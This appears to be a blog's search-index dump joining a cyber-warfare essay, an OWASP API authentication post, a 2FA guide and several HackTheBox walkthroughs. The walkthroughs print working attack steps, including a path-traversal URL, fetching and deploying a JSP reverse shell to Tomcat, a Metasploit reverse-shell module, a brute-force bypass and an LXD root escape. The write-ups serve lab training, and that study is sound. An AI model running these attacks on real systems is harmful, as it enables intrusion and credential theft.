assignment in English for my studies. Please forgive my mistakes (if there is any).IntroductionFor many years, computers have been an integral part of our lives. So much so that some people even consider that our smartphones are an “extension of our hands”. Living without the Internet has become almost unimaginable for both individuals and businesses. The thing is, nowadays almost everything is connected: computers, printers, cameras, cars … even pacemakers! And the more you depend on IT, the more vulnerable you are to cyber attacks.On December 23 in 2015, about 230,000 Ukrainians were plunged into darkness following a gigantic power cut due to malicious softwares. Considering all these facts, we can ask ourselves : Does Cyber warfare have the potential to result in more serious consequences for humanity than warfare using conventional weapons?CyberweaponsCould viruses eradicate lives in seconds like nuclear-bombs ? Is it already too late ? Robert Mueller, the Former FBI Director once said : “There are two types of companies: those that have been hacked, and those that will be.“.Indeed, unlike conventional weapons, malwares are not visible, attacks can come from anywhere. For instance, the 2003 Northeast blackout was initiated by a virus in an energy company (FirstEnergy). The employees couldn’t figured out because they had no alarms to warn them. On the other hand, identifying the authors is a really difficult task: is it initiated by one person? an organized group? hacktivists? a country? a criminal organisation? a bunch of script kiddies ? Who knows? script kiddies: unskilled individuals *(usually teenagers)* who use scripts or programs developed by others to attack computer systems and networks in order to impress their friends or gain credit in computer-enthusiast communities. SourceBesides, the simple fact to plug in a malicious USB key (like a Rubber ducky) is sufficient to infect a computer and by extension the network to which it is connected. The most used cyber attack is phishing : sending e-mails containing malicious links or attachments such as Word and Excel like documents which actually are Trojan horses.These types of attacks were used to install a malware which is called BlackEnergy into Ukrainian’s power grid computers. “Mouse cursors on employees’ computers interfaces started to move as if on their own, activating menus and pressing buttons in the control software, opening breakers in the distribution substations, one by one.” (Read: hackers take over power grid computer)The problem is that those systems were designed to prioritize availability over security and not to be facing cyber attacks.Furthermore, in a cyber warfare killing people is not necessary because you have them at your mercy. Paralyzing critical infrastructure is a sufficient mean of pressure (for instance, threatening them to cut off electricity during the winter could cause them to die of cold…).On the other hand, the aim of a virus isn&#39;t always to destroy a system. It depends on the attackers’ ambition (spying, stealing informations..). There’re also the fake news thematic.The complexity of Cyber WarHowever, the art of hacking and exploitation of vulnerabilities is a very complex and esoteric discipline. The real elegance of an attack is its planning and execution.In fact, the result of a cyber weapon execution is not as sure as an airplane bomb. If you drop a bomb or a missile, the damage will be certain. In the case of BlackEnergy attack, the Ukrainians managed to restore power in just six hours. For an industrial company, a cyber attack is not the only threat, and maybe not even the worst (hurricanes, terrorists…etc).As a matter of fact, even if competent people intended to carry out a cyberattack, it would take them months or even years. Any serious hacker will not rely on luck. In order to ensure that their attack will work, they have to spend thousands of hours for data gathering, identifying weak points of the target(s), conducting specific tests with the same devices and so on.In other words, they need a lot of skills and resources that only a nation-state or a very wealthy organization could have, and even then, it’s hard to guarantee success.ConclusionIn conclusion, cyber weapons may have the potential to result in very serious consequences for humanity and is already an additional way to attack countries. A power shutdown in a vast country is not as simple as it seems. Nevertheless, cyber attacks are a threat that countries cannot underestimate.Nowadays, we can consider that malwares are not as dangerous as conventional weapons. The only question is: for how long ?Resources malicious.life poadcast Peut-on Conquérir un Pays grâce à l’Informatique ? Wikipedia: 2003 Northeast blackout Wired: Hackers take over power grid computer Forbes: Cutting Through The ‘Fake News:’ Proof That Russia Is Hacking Everyone Wired: Inside the Cunning, Unprecedented Hack of Ukraine’s Power GridGoing further… TheHackerNews: Israel Neutralizes Cyber Attack by Blowing Up A Building With Hackers ZDnet: Hacker modified drinking water chemical levels in a US city Wired: The Dire Possibility of Cyberattacks on Weapons Systems Le monde en cartes: Espionnage, sabotage… Géopolitique dans le cyberespace Arte (Le Dessous des cartes): Le cyber, nouvel espace géopolitique" }, { "title": "Passage Writeup", "url": "/Passage-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, passage", "date": "2021-03-07 21:40:00 +0700", "snippet": " Reconnaissance Let&#39;s start off with a NMAP scanBrowsing to http://10.10.10.206 we get a page wth a bunch of posts, users and email addresses.I did a bunch of XSS and LFI but none worked. We cannot use any Gobuster / wfuzz enumeration as fail2ban will block is after a few seconds so we have to do this manually.I checked the RSS feed and we get a new folder /CuteNewsI then go to the CuteNews page.Let&#39;s register a user and then login.Browsing around didn&#39;t give me anything much to play with so then I checked the version of CuteNews and see if there is maybe an exploit in the current software version with searchsploit Exploitation and gaining access We find 4 exploits we can use. I opted for the metasploit one because I was lazy. OffSec will not be pleased ;)We need the .rb file as Metsploit doesn&#39;t have the module in its database.So we are going to download the file via searchsploit, copy it to metasploit to use and then load the module into metasploit.We then have to configure the options. Set the rhosts, lhost (your tun0 ip address) and also set the username and password to what we registered as above.Then we run the exploit and we should see a meterpreter shell!We run sysinfo to make sure we are on the machine and we also check to see what user we are.We need to get a proper shell.After enumerating for quite a while I managed to find the following interesting file.We need to get the hashes and then base64 decode them but first we need to prepare a nice faster way instead of manually doing it.cat lines | grep YT | sed &#39;s/^/echo \\&quot;/&#39; | sed &#39;s/$/&quot; | base64 -d/g&#39; &amp;gt; lines.hashed I manually added the hashes to a file.We run one of the hashes through hash-identifier to see what hash it is.Looks to be a SHA-256 hash.Now we run hashcat.We now have a password for the hash e26f3xxxxxf8108120723ebe690e5d3d61628f4130076ec6cb43f16f497273cd and looking at the file from previously we can see that this hash belongs to paul@passage.htbWe try to ssh with the user paul and the password but we get a login failure probably because we will need a ssh key for the user.We just use the normal su method, login and then grab the user flag :)Let&#39;s go grab that ssh key! Copy Paul&#39;s id_rsa key.I renamed it to paul.ssh and then used that to ssh.I had a look in the .ssh directory and I found the following which we can use.We can just ssh to the nadav user as it seems Paul and Nadav are using the same ssh keys. Privilege Escalation to root After enumerating for quite a bit, looking at the running processes we find the following.Let&#39;s go Google and see what we can do with this process.Looks like we might have the right exploit! The username on the box and the author of the article is strangly the same!Let&#39;s get an idea what this exploit does.Time to run the exploit commands and get the ssh key from root as we are able to copy ANY file on the system to a specified file for us to access.Copy the key and use the key to ssh into the server as root and grab the root flag!This was a pretty fun box I have to say. Thank you ChefByzen for a great box!" }, { "title": "HackTheBox - Tabby", "url": "/htb-tabby/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, gobuster, dirb, LFI, tomcat, reverse-shell, John The Ripper, zip2john, LXD group privesc, writeup, oscp-prep", "date": "2021-03-05 02:00:59 +0700", "snippet": "Footholdnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Tabby-full-port-scan.txt 10.10.10.194PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)| 256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)|_ 256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Mega Hosting8080/tcp open http Apache Tomcat|_http-open-proxy: Proxy might be redirecting requests|_http-title: Apache Tomcat20688/tcp filtered unknownService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelApache/2.4.41 (port 80)The main page of port 80 reveals a domain name megahosting.htb (that we can immediately add to our /etc/hosts file):Second thing we can notice is that data breach statement that redirects to http://megahosting.htb/news.php?file=statement.Due to the .php?file=statement, I wanted to try for LFI and it works:http://megahosting.htb/news.php?file=../../../../../../../../../../../The presence of lxd, tomcat, and mysql in /etc/passwd may be useful later. Let’s check port 8080.Tomcat9 (port 8080)Tomcat 9 seems to be used. Plus, we can read that users are defined in /etc/tomcat9/tomcat-users.xml:Via gobuster and dirb, we see that there some “hidden” folders like /manager. Accessing this page requires credentials:At this point, we can say that we want to take avantage of the LFI we found to retrieve tomcat-users.xml.After trying several path and looking for tomcat’s installation and configuration directories, I came across with this successful one http://megahosting.htb/news.php?file=../../../../../../../../../../../usr/share/tomcat9/etc/tomcat-users.xmlThe user is tomcat and his password is $3cureP4s5w0rd123!.Surprisingly, we got an “access denied” response on manager when we log in:Exploiting Tomcat to gain a reverse shellReading at hacktricks - pentesting web (tomcat), I understood that by deploying a malicious WAR file via tomcat, I can run malicious code. WAR files are just zip files.I looked for jsp(JavaServer Pages) reverse shell and I used the first one:https://gist.github.com/halozheng/bf0eaa60c5f166dbc848$ wget https://gist.githubusercontent.com/halozheng/bf0eaa60c5f166dbc848/raw/a8a53f3275c378897b24dd04e385465d0bee06b6/shell.jsp# Edit shell.jsp with HTB IP and listener port$ zip monshell.war shell.jsp$ curl --upload-file monshell.war -u &quot;tomcat:\\$3cureP4s5w0rd123!&quot; &quot;http://10.10.10.194:8080/manager/text/deploy?path=/monshell&quot;OK - Deployed application at context path [/monshell]# Run a listener$ nc -lnvp 1234...Visiting http://10.10.10.194:8080/monshell/shell.jsp and we have a reverse shell as user tomcat:User: ashNow if we remember the /etc/passwd file we saw earlier, or if we just take a look at /etc/home, we see there is a user called ash.I wanted to list all files that belongs to him and I found an interesting zip file:$ find / -user ash 2&amp;gt;/dev/null/var/www/html/files/var/www/html/files/16162020_backup.zipTo get it on my own machine I printed the base64 of the file’s content then I pasted it in a new file:# On victim&#39;s machine$ base64 16162020_backup.zip...# On my machine$ cat &amp;gt; file.b64... $ base64 -d file.b64 &amp;gt; 16162020_backup.zip$ file 16162020_backup.zip 16162020_backup.zip: Zip archive data, at least v1.0 to extractCracking zip with johnDo not forget zip2john:$ zip2john 16162020_backup.zip &amp;gt; 16162020_backup.johnAnd we retrieved the following password: admin@it.tomcat@tabby:~$ su ashPassword: admin@itash@tabby:/opt/tomcat$ cdash@tabby:~$ cat user.txt 662b777f8536a0dce33afdd15851778bPrivesc via LXD Group (Road to oot)Ash is part of lxd group:Following the steps of this hacktricks article, we can perform a privilege escalation: On our machine:#Install requirementssudo apt updatesudo apt install -y golang-go debootstrap rsync gpg squashfs-tools#Clone repogo get -d -v github.com/lxc/distrobuilder#Make distrobuildercd $HOME/go/src/github.com/lxc/distrobuildermakecd#Prepare the creation of alpinemkdir -p $HOME/ContainerImages/alpine/cd $HOME/ContainerImages/alpine/wget https://raw.githubusercontent.com/lxc/lxc-ci/master/images/alpine.yaml#Create the containersudo $HOME/go/bin/distrobuilder build-lxd alpine.yaml -o image.release=3.8 Transfer ` lxd.tar.xz and rootfs.squashfs on victim&#39;s machine. Then run lxd init` and these commands:$ lxc image import lxd.tar.xz rootfs.squashfs --alias alpine$ lxc image list #You can see your new imported image$ lxc init alpine privesc -c security.privileged=true$ lxc list #List containers$ lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true$ lxc start privesc$ lxc exec privesc /bin/sh~# cd /mnt/root #Here is where the filesystem is mountedFlag:$ cat root.txt 26571b9decff2a772d66c476d47d4875Useful links https://askubuntu.com/questions/135824/what-is-the-tomcat-installation-directory https://book.hacktricks.xyz/pentesting/pentesting-web/tomcat https://gist.github.com/halozheng/bf0eaa60c5f166dbc848 https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation" }, { "title": "HackTheBox - Academy", "url": "/htb-academy/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, Laravel, metasploit, CVE-2018-15133, CVE-2017-16894, reverse-shell, plain text password, Linux logging passwords, composer, GTFOBins, writeup, oscp-prep", "date": "2021-03-04 01:44:17 +0700", "snippet": "FootholdNmap Scan (open Ports)$ nmap -min-rate 5000 --max-retries 1 -sV -oA Academy 10.10.10.215Nmap scan report for 10.10.10.215Host is up (0.027s latency).Not shown: 998 closed portsPORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelApache httpd (port 80)Once we go to http://10.10.10.215, we can see two links: http://10.10.10.215/login.php http://10.10.10.215/register.phpIf we check the source-code of the register page, we can notice there is an input which is hidden:If we set its value to 1, we can access to: http://10.10.10.215/admin-page.phpOnce we’re logged in, we can see there is a sub-domain whcih is mentionned dev-staging-01.academy.htb:We add these domains into our /etc/hosts:Then we access to the subdomain:It seems to be a Laravel backend:We can notice there are some sensible information like:Using metasploit, we can gain a reverse shell to web server:msf6 &amp;gt; use exploit/unix/http/laravel_token_unserialize_exec[*] Using configured payload cmd/unix/reverse_perl# Setting optionsmsf6 exploit(unix/http/laravel_token_unserialize_exec) &amp;gt; show options... Name Current Setting Required Description ---- --------------- -------- ----------- APP_KEY dBLUaMuZz7Iq06XtL/Xnz/90Ejq+DEEynggqubHWFj0= no The base64 encoded APP_KEY string from the .env file Proxies no A proxy chain of format type:host:port[,type:host:port][...] RHOSTS 10.10.10.215 yes The target host(s), range CIDR identifier, or hosts file with syntax &#39;file:&amp;lt;path&amp;gt;&#39; RPORT 80 yes The target port (TCP) SSL false no Negotiate SSL/TLS for outgoing connections TARGETURI / yes Path to target webapp VHOST dev-staging-01.academy.htb no HTTP server virtual hostPayload options (cmd/unix/reverse_perl): Name Current Setting Required Description ---- --------------- -------- ----------- LHOST 10.10.14.11 yes The listen address (an interface may be specified) LPORT 4444 yes The listen portUser1: cry0l1t3In the /home directory, we can see there are a bunch of users. One one them has a user.txt file:By doing some recursive research through files upon files we find this password:It appears that it’s the password of cry0l1t3 user.cry0l1t3@academy:/home/cry0l1t3:~$ cat user.txt064f918982d32d8040efb7c1b66a486User2: mrb3ncry0l1t3 is part of the adm group.Via find we can list all files that are owned by this group:find / -group adm -exec ls -la {} \\; 2&amp;gt;/dev/nullMost of them are in /var/log.After reading about linux var log files, I found this article “Logging passwords on Linux”. Before continuing, I highly recommend that you read this article.In /var/log/audit/ directory, we can retrieve mrb3n’s password:cry0l1t3@academy:/var/log/audit$ grep &quot;data=&quot; * audit.log.3:type=TTY msg=audit(1597199290.086:83): tty pid=2517 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;sh&quot; data=7375206D7262336E0Aaudit.log.3:type=TTY msg=audit(1597199293.906:84): tty pid=2520 uid=1002 auid=0 ses=1 major=4 minor=1 comm=&quot;su&quot; data=6D7262336E5F41634064336D79210A...cry0l1t3@academy:/var/log/audit$ echo 7375206D7262336E0A | xxd -r -psu mrb3ncry0l1t3@academy:/var/log/audit$ echo 6D7262336E5F41634064336D79210A | xxd -r -pmrb3n_Ac@d3my!RootNow that we have access to mrb3n account, let’s do some enumeration and see what we can do with sudo:composer is listed in GTFOBins:To perform a privesc, we can exploit it and then become root:Useful links Linux var log files Logging Passwords on Linux - /var/log/audit/audit.log" }, { "title": "Monteverde Writeup", "url": "/Monteverde-Writeup/", "categories": "hackthebox", "tags": "hackthebox, writeup, monteverde", "date": "2021-03-03 15:15:00 +0700", "snippet": " Reconnaissance Let&#39;s start off with a NMAP scan-sV: Probe open ports to determine service/version info-sC: equivalent to --script=defaultWe see this machine does not have any webserver, ssh or anything like that. It does have smb which we can try enumerate first.We run the command enum4linux 10.10.10.172 to see if we can get a list of users, groups and any information we can use.From the results, we get a list of users, along with groups but for now we will only focus on the users.Take the list of users and put them into a file. In my case, users.txtWe are going to use this to bruteforce smb login.Set the relevant options and use the users.txt file for both user and password list.Reason I am doing this is I usually test for default passwords as an easy win.FootholdYou can try the usernames and password manually but I tend to automate things for quicker results.Let us start up mfsconsole and use the smb_login module to enumerate throught the list. We find a hit!Let&#39;s use this with a command called smbclient to see what shares we can access and find any files or infomation we can use to further enumerate.We grab the azure.xml file and we find the following juicey information.We find a password. Let us use that password for the user mhope to log into the machine via evil-winrm.What do you know, we are logged in and browsing to the Desktop folder we have the user flag!Exploit to AdministratorLet&#39;s browse the user&#39;s folders and see what we can find.There is a .Azure folder which could be a hint as to what to look for.Checking the user&#39;s access shows us what groups he is part of and see what users that group has access to.Let&#39;s check on the system for any Azure applications installed. We find that Azure AD Sync is installed in the following location.Now it&#39;s time to see if we can find any articles for some way to use this service for any escalation.I am not going to explain what happens here, go read it for yourself.Azure AD Connect for Red TeamersOn the page we can find the POC which connects to the SQL localdb, grabs the encrypted hash, decrypts it and gives us the gold! We first download the file or copy the contents into a file. e.g azure_decrypt.ps1It didn&#39;t work at first but after some troubleshooting and reading up on connecting to SQL via the CLI I had to change a part in the parameters to get it working 100%.Once the changes are done, connect back to the machine, upload the powershell script, change directory to the Azure AD Sync directory and run the powershell script.We now should have the administrator credentials which we can use now to login to the machine via evil-winrm and grab the root flag!" }, { "title": "OWASP API Security Broken User Authentication", "url": "/user-authentication/", "categories": "Blogging, Tutorial, Broken User Authentication", "tags": "OWASP API, OWASP API Security Top 10, post, get, put, delete, server API, CLient API, Graphql API, JWT, Broken User Authentication, OWASP API Security, API Security", "date": "2021-02-06 00:00:00 +0700", "snippet": "kamu mungkin pernah mendengar tentang Top 10 OWASP atau sepuluh kerentanan teratas yang mengancam Webapps. OWASP juga secara berkala memilih daftar sepuluh besar kerentanan yang mengancam API, yang disebut OWASP API Security Top 10. Sepuluh besar API saat ini adalah : Broken Object Level Authorization Broken User Authentication Excessive Data Exposure Lack of Resources &amp;amp; Rate Limiting Broken Function Level Authorization Mass Assignment Security Misconfiguration Injection Improper Assets Management Insufficient Logging &amp;amp; MonitoringBanyak dari kerentanan ini memengaruhi komponen aplikasi selain API, tetapi cenderung memanifestasikan dalam API. Terakhir kali, saya berbicara tentang salah satu kerentanan API yang paling umum: Broken Object Level Authorization.API SecurityOWASP API Security Broken User AuthenticationDari pengalaman saya meretas API, saya yakin bahwa sebagian besar implementasi API mengalami setidaknya satu contoh Broken Object Level Authorization. Kali ini, mari kita bicara tentang OWASP API #2: OWASP API Security Broken User Authentication.Otentikasi untuk API. Seringkali, meminta kredensial user atau menggunakan autentikasi multi-faktor tidak mungkin dilakukan selama panggilan API. Jadi otentikasi dalam sistem API sering diimplementasikan menggunakan akses token: token yang disematkan ke dalam panggilan API individual untuk mengautentikasi user. Jika otentikasi tidak diterapkan dengan benar, penyerang dapat mengeksploitasi kesalahan konfigurasi untuk menyamar sebagai orang lain.OWASP API Security tanpa otentikasiPertama-tama, API dapat kekurangan mekanisme otentikasi sama sekali. Terkadang, pengembang API berasumsi bahwa API hanya akan diakses oleh aplikasi resmi dan tidak akan ditemukan oleh orang lain. Jadi API tersedia bagi siapa saja yang mengetahui dan struktur query nya. Dalam hal ini, siapa pun bebas meminta data atau menjalankan tindakan melalui API jika mereka mengetahui struktur query nya.Implementasi otentikasi yang salahAPI yang tidak memiliki autentikasi menjadi kurang umum. Sebagian besar waktu, OWASP API Security Broken User Authentication disebabkan oleh desain atau implementasi Broken User Authentication token yang salah.Satu kesalahan umum adalah tidak menghasilkan akses token dengan benar. Pertama-tama, jika token pendek, sederhana, atau dapat diprediksi, penyerang mungkin dapat melakukan brute force token. Ini dapat terjadi ketika token dihasilkan dengan entropi yang tidak mencukupi atau berasal dari informasi user menggunakan enkripsi atau algoritma hashing yang lemah. Misalnya, apa yang salah dengan token API berikut?access_token=RW5v==Token hanyalah pengkodean base64 dari nama user, “Eno”!API yang tidak menggunakan string akses token sederhana juga bisa tidak aman. Misalnya, JSON Web Tokens (JWTs) juga dapat ditandatangani dengan tidak benar atau tidak ada tanda tangan sama sekali. Masalah ini sangat berbahaya jika token tidak aman digunakan untuk mengautentikasi admin atau orang lain dengan hak akses ke dalam API. Jika kamu tertarik untuk mempelajari lebih lanjut tentang potensi jebakan JWT, baca posting saya di sini: Token Web JSONToken berumur panjangBahkan jika token dihasilkan dengan benar, pembatalan token yang tidak tepat juga dapat menyebabkan masalah. Token berumur panjang adalah masalah keamanan besar di banyak implementasi API.Token API harus kedaluwarsa secara berkala dan setelah tindakan sensitif seperti logout, perubahan sandi, pemulihan akun, dan penghapusan akun. Jika akses token tidak divalidasi dengan benar, penyerang dapat mempertahankan akses ke sistem tanpa batas waktu setelah mencuri token.Kebocoran tokenTerkadang, pengembang mengirimkan akses token secara tidak aman, seperti di URL atau melalui trafic yang tidak terenkripsi.Jika token dikirimkan melalui URL, siapa pun yang memiliki akses ke URL melalui ekstensi browser atau riwayat penelusuran dapat mencuri token tersebut.https://api.example.com/v1.1/users/payment/show?user_id=1337&amp;amp;access_token=360f91d065e56a15a0d9a0b4e170967bDan jika token ditransmisikan melalui trafic yang tidak terenkripsi, penyerang dapat meluncurkan serangan Man in the Middle MITM untuk menyadap trafic korban dan mencuri token API.Mencegah Broken User AuthenticationUser Authentication sangat merusak API karena satu kesalahan dapat memungkinkan penyerang mengambil alih akun user, mengakses data dan fungsionalitas yang dibatasi.Mencegah masalah ini membutuhkan pendekatan yang komprehensif. Pertama, Kamu perlu memastikan bahwa kamu menerapkan akses kontrol untuk semua data dan fungsi sensitif. Ini dibahas dalam posting blog terakhir saya tentang Broken Object Level Authorization. Lagi pula, otentikasi sia-sia kecuali kamu menggunakannya untuk membatasi akses ke sistem!Selanjutnya, pastikan API token kamu berupa string yang panjang, acak, dan tidak dapat diprediksi. Jika kamu menggunakan token yang berasal dari informasi user, gunakan algoritme yang kuat dan secret key untuk memastikan bahwa user tidak dapat memalsukan token mereka sendiri. Terakhir, jika API kamu menggunakan autentikasi berbasis tanda tangan seperti JWT, terapkan tanda tangan yang kuat pada token dan validasikan dengan benar.Batalkan token secara berkala dan setelah tindakan seperti logout, reset kata sandi, pemulihan akun, dan penghapusan akun. Terakhir, perlakukan akses token sebagai key dan jangan pernah mengirimkannya dalam URL atau trafic yang tidak terenkripsi.Broken User Authentication dapat menyebabkan insiden keamanan yang serius, jadi mencegahnya harus menjadi prioritas utama kamu sebagai pengembang. Lain kali, mari kita lihat sepuluh besar API OWASP #3, Excessive Data Exposure, kerentanan yang paling sering saya temukan di API." }, { "title": "2FA Your Accounts", "url": "/2FA-Your-Accounts/", "categories": "blog, security, security awareness", "tags": "authentication, security, security awareness", "date": "2021-01-30 10:00:00 +0700", "snippet": "In this day and age if you are not using 2FA, you are not taking security seriously. Most of us use our email address to log in to most of our social media, banking or use it to send our password resets to.Should attackers get access to your email account then they potentially have access to the rest of your accounts unless there is some sort of Two-Factor Authentication set up.If 2FA is enabled and someone steals or hacks your password for your account, they would not be able to get into your account because they would still need the 2FA to get in because you have your 2FA.There are three (there are more) common factors used for authentication: Something you KNOW : a password, pin or secret question Something you HAVE : smartphone, smartcard, security token Something you ARE : fingerprint or retina scanWhat is 2FA you may ask?2FA stands for Two-Factor Authentication. So in essence, it takes something you KNOW (username and password) and something you HAVE (smartphone with an authenticator application) as a combination to log in to your account.When you log in to your email or facebook, you enter your username and password and it logs you straight in. This is known as Single Factor Authentication.2FA adds a second layer of security whereby once you log in with your username and password, you will be required to enter another piece of information, something you HAVE.2FA can come in many forms but the most common is either some sort of authenticator application that is installed on your smartphone/computer (Google Authenticator, Microsoft Authenticator, Authy, web-browser plugin), a hardware device (Yubico), or an OTP (One Time Pin) via SMS, but this method via SMS is known to be insecure as this can be easily circumvented in some cases and should only be used in cases where an authenticator application cannot be used at all. You can use multiple methods to secure your accounts which is then called MFA, Multi-Factor Authentication.One thing to take note is, when you use an authenticator it is vital to save the recovery codes to your computer or a safe place in the event you lose your smartphone. If the authenticator has a backup option, be sure to use that. You don&#39;t want to sit in a situation where you have lost your phone and then you have no way to use the 2FA. GitHub Example for Two-Factor AuthenticationLet&#39;s have a look at how this works.We log in to Github with our user test@test.com and our password test123We then get prompted to enter our Two-Factor Authentication code that is found in our authenticator application.And now we will be logged into GitHub.Setting up Facebook for 2FADo note that I am going to use Facebook and Google Authenticator but you could be setting it up for Instagram, GMAIL or Discord and also with another Authenticator Application. You will have to look in the settings of that specific application and find the 2FA section. This is to just give you an idea of what to look for and how to set it up for your account.* Login to your Facebook account, click on the top right and then click &quot;Settings &amp;amp; Privacy&quot; (shown in red) * Click &quot;Settings&quot; * Click &quot;Security and Login&quot; on the left hand side. * On the page you will see &quot;Two-Factor Authentication&quot;. Click &quot;Edit&quot; on the right hand side. * You should see the following in green saying &quot;Recommended&quot; in the Authentiction App section. * Click &quot;Use Authentication App&quot; in the blue box. * You will be prompted with a QR code which you now have to scan with the Authenticator Application on your smartphone. * I installed the Google Authenticator App from the Play Store but yours could be different. (Authy, Microsoft Authenticator, etc) * Open your Authenticator Application on your smartphone, in my case, Google Authenticator. * Select the &quot;Scan a QR code&quot; and then point it to the QR code as seen above. * This will now add your Facebook account. * On your smartphone&#39;s screen you will notice a 6 digit number, along with a timer that counts down and resets that number every 30 seconds. * Back on your Facebook page you can now enter the 6 digits that is in your Authenticator Application. * So if the number is showing 123-456, enter 123456 as below. * You will then be prompted with the following. Click Done * You will be prompted to enter your Facebook password to confirm. * Now you will have 2FA enabled on your Facebook account. * Log out of Facebook and log back in. * Enter your 2FA code from your Authenticator Application.* You will be prompted to Remember Browser.* If you select Save Browser, everytime you log into Facebook with the same browser on the computer, you will not be prompted for the 2FA but if you select Don&#39;t Save, you will need to enter your 2FA each time you log in. * This is only applicable if you log out of Facebook. Closing the browser window does not log you out of Facebook.I hope this guide was clear enough to follow and you are aware of the dangers of not having at least some form of 2FA enabled on your online accounts.Should you require any assistance, please feel free to reach out. My twitter DMs are open.Be safe, be vigilant." }, { "title": "HackTheBox - Blunder", "url": "/htb-blunder/", "categories": "Hackthebox walkthroughs, Linux, Easy", "tags": "htb-linux-easy, Bludit, searchsploit, brute-force, bruteforce protection bypass, chaining exploits, CVE-2019-17240, CVE-2019-16113, cewl, custom wordlist, reverse-shell, linpeas, hashcat, Rule-based Attack, sudo undeflow, CVE-2019-14287, writeup, oscp-prep", "date": "2021-01-20 23:37:00 +0700", "snippet": "Enumerationnmap scan$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Blunder-full-port-scan.txt 10.10.10.191PORT STATE SERVICE VERSION21/tcp closed ftp80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-generator: Blunder|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Blunder | A blunder of interesting factsApache/2.4.41 (port 80)gobuster$ gobuster dir -u http://$TARGET/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -x .txt#.../0 (Status: 200)/LICENSE (Status: 200)/about (Status: 200)/admin (Status: 301)/cgi-bin/ (Status: 301)/robots.txt (Status: 200)/todo.txt (Status: 200)#.../todo.txtWe identified a potential user: fergus/admin (BLUDIT)On /admin we can see there is a Bludit (CMS) login page:Looking at HTML source code, I found that:I assumed that Bludit’s version was 3.9.2:searchsploitThere are some exploits against Bludit:multiple/webapps/48701.txt allows us to obtain a reverse shell but it requires authentification.php/webapps/48942.py can be used to bypass brute force protection.FootholdCeWL - Custom Word List generatorUsing a cool tool named cewl, we can generate a custom wordlist based on website keywords:$ cewl http://10.10.10.191/ &amp;gt; cewl-wordlist.txt48942.py - Bludit Auth Bruteforce BypassI copied /usr/share/wordlists/seclists/Usernames/top-usernames-shortlist.txt as users.txt and I added fergus to this wordlist .Then I ran 48942.py:$ python3 48942.py -l http://10.10.10.191/admin/login.php -u users.txt -p cewl-wordlist.txt The trick part of this bruteforce protection bypass is the HTTP header X-FORWARDED-FOR as explained in Bludit Brute Force Mitigation Bypass.SUCCESS! The password of fergus is RolandDeschain:48701.py - Directory Traversalmultiple/webapps/48701.txt comes with a python script that need some parameters: target URL a valid username a valid password a malicious PNG image containing PHP code with reverse shell (we can use msfvenom) an .htaccess file with specifics instructionsReverse shellThen we have to visit http://10.10.10.191/bl-content/tmp/temp/evil.png and we got a shell: I used msfvenom to generate evil.png in the first place, but finally I replaced it with tiny PHP/bash reverse shell because I couldn’t upgrade my shell using msfvenom solution.After getting a shell, I executed linpeas.sh and I saw a potential password in /var/www/bludit-3.10.0a/bl-content/databases/users.php:$ cat /var/www/bludit-3.10.0a/bl-content/databases/users.php &amp;lt;?php defined(&#39;BLUDIT&#39;) or die(&#39;Bludit CMS.&#39;); ?&amp;gt;{ &quot;admin&quot;: { &quot;nickname&quot;: &quot;Hugo&quot;, &quot;firstName&quot;: &quot;Hugo&quot;, &quot;lastName&quot;: &quot;&quot;, &quot;role&quot;: &quot;User&quot;, &quot;password&quot;: &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot;, &quot;email&quot;: &quot;&quot;, &quot;registered&quot;: &quot;2019-11-27 07:40:55&quot;, &quot;tokenRemember&quot;: &quot;&quot;, &quot;tokenAuth&quot;: &quot;b380cb62057e9da47afce66b4615107d&quot;, &quot;tokenAuthTTL&quot;: &quot;2009-03-15 14:00&quot;, &quot;twitter&quot;: &quot;&quot;, &quot;facebook&quot;: &quot;&quot;, &quot;instagram&quot;: &quot;&quot;, &quot;codepen&quot;: &quot;&quot;, &quot;linkedin&quot;: &quot;&quot;, &quot;github&quot;: &quot;&quot;, &quot;gitlab&quot;: &quot;&quot;}}It is a hexadecimal string of length 40 so it’s certainly a hash and not a password!hashcat rule based attackLet’s try to crack it via hashcat:$ echo -n &quot;faca404fd5c0a31cf1897b823c695c85cffeb98d&quot; &amp;gt; hash.txt $ hashcat -m 100 hash.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule#...faca404fd5c0a31cf1897b823c695c85cffeb98d:Password120#... We could also use md5decrypt.net.User (hugo)We can log in as hugo with the password we just found: Password120.www-data@blunder:/tmp$ su hugoPassword: Password120hugo@blunder:~$ iduid=1001(hugo) gid=1001(hugo) groups=1001(hugo)hugo@blunder:~$ cat user.txt4136078049bf0679491413a880cb1b42hugo@blunder:~$ sudo -lPassword: Password120Matching Defaults entries for hugo on blunder: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/binUser hugo may run the following commands on blunder: (ALL, !root) /bin/bashsudo’s version is 1.8.25 is vulnerable to CVE-2019-14287 that could allow privilege escalation, even though the configuration explicitly disallows 